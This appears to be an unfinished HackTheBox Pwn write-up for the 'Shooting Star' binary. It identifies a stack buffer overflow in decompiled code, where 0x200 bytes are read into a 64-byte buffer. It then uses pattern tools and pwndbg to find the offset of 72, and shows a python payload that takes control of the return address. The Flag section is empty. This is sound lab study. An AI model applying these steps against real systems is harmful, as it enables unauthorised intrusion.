---
Category:
  - Pwn
Difficulty: Easy
Platform: HackTheBox
Status: 1. In progress
---
>[!quote]
> *Tired of exploring the never-ending world, you lie down and enjoy the crystal clear sky. Over a million stars above your head! Enjoy the silence and the glorious stars while you rest.*


# Set up

No setup required

# Information Gathering

Binary type and protections:

```
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ file shooting_star 
shooting_star: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=78179254768c1362423b4d4b124ff480b059febe, for GNU/Linux 3.2.0, not stripped

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ checksec --file=shooting_star                                                                                                                                                                                                       1 ⨯
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               1               shooting_star

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ /home/maoutis/.local/bin/checksec --file shooting_star                                                                                                                                                                              2 ⨯
[*] '/home/maoutis/CTF/HTB/Pwn/ShootingStar/shooting_star'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Binary workflow:

```
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ ./shooting_star
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> test test

May your wish come true!

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ ./shooting_star                                                                                                                                                                                                                    26 ⨯
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 2
Isn't the sky amazing?!

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ ./shooting_star                                                                                                                                                                                                                    24 ⨯
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 3
A star is an astronomical object consisting of a luminous spheroid of plasma held together by its own gravity. The nearest star to Earth is the Sun. Many other stars are visible to the naked eye from Earth during the night, appearing as a multitude of fixed luminous points in the sky due to their immense distance from Earth. Historically, the most prominent stars were grouped into constellations and asterisms, the brightest of which gained proper names. Astronomers have assembled star catalogues that identify the known stars and provide standardized stellar designations.
```

Decompiled code:

- main.c
    
    ```c
    void main(void)
    
    {
      setup();
      write(1,&menuMsg,0x5b);
      star();
      return;
    }
    ```
    
- **star.c**
    
    ```c
    void star(void)
    
    {
      char menuVal [2];
      undefined input [64];
      
      read(0,menuVal,2);
      if (menuVal[0] == '1') {
        write(1,&cmdPrompt,3);
        read(0,input,0x200);
        write(1,"\nMay your wish come true!\n",0x1a);
      }
      else {
        if (menuVal[0] == '2') {
          write(1,"Isn\'t the sky amazing?!\n",0x18);
        }
        else {
          if (menuVal[0] == '3') {
            write(1,
                  "A star is an astronomical object consisting of a luminous spheroid of plasma heldtogether by its own gravity. The nearest star to Earth is the Sun. Many other starsare visible to the naked eye from Earth during the night, appearing as a multitude offixed luminous points in the sky due to their immense distance from Earth.Historically, the most prominent stars were grouped into constellations andasterisms, the brightest of which gained proper names. Astronomers have assembledstar catalogues that identify the known stars and provide standardized stellardesignations.\n"
                  ,0x242);
          }
        }
      }
      return;
    }
    ```
    

# The Bug - Buffer Overflow

There is Buffer overflow in **star.c:** the program allocates 64 bytes to the `input` array, however it then read 512 bytes from stdin using `read(0,input,0x200);` overflowing adjacent memory locations. 

# Exploitation

Found the buffer overflow and calculated the offset:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ ./shooting_star
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

May your wish come true!
zsh: segmentation fault  ./shooting_star

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ gdb -q shooting_star
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from shooting_star...
(No debugging symbols found in shooting_star)
pwndbg> r
...
R15  0x0
RBP  0x3363413263413163 ('c1Ac2Ac3')
RSP  0x7fffffffde58 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
RIP  0x4011ec (star+170) ◂— ret
──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
► 0x4011ec <star+170>    ret    <0x6341356341346341>

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ msf-pattern_offset -l 100 -q 0x6341356341346341
[*] Exact match at offset 72
```

Controlled EIP:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ python3 -c 'print("A"*72+"B"*8+"C"*16 )'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCCCCCCCCC

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/ShootingStar]
└─$ gdb -q shooting_star
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from shooting_star...
(No debugging symbols found in shooting_star)
pwndbg> r
...
R15  0x0
RBP  0x4141414141414141 ('AAAAAAAA')
RSP  0x7fffffffde58 ◂— 0x4242424242424242 ('BBBBBBBB')
RIP  0x4011ec (star+170) ◂— ret
─────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
► 0x4011ec <star+170>    ret    <0x4242424242424242>
```

# Flag